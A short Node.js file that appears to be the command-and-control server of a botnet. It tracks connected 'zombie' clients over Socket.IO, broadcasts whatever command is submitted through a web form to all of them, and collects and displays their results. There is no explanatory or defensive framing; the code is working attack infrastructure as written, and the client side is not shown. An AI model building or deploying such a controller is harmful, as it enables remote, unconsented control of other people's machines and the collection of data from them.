const express = require('express');
const app = express();
const http = require('http').Server(app);
const bodyParser = require('body-parser')
const io = require('socket.io')(http);

const clients = {};
const results = [];

io.on('connection', function (client) {
    console.log("Zombie " + client.id + " connected.");
    clients[client.id] = client.id;    
    
    client.on("result", function (result) {
        results.push(result);
    });

    client.on('disconnect', function () {
        console.log("Zombie " + client.id + " disconnected.");
        delete clients[client.id];
    });
});

app.set('view engine', 'pug');
app.use(bodyParser.urlencoded({
    extended: true
}));

app.get('/', function (req, res) {
    res.render('index', { zombies: clients, results });
});

app.post('/command', function (req, res) {
    io.emit("command", req.body.command);    

    res.setTimeout(3000, function(){
        res.render('index', { zombies: clients, results });
    });
});

http.listen(3000, function () {
    console.log('server is running on port 3000');
});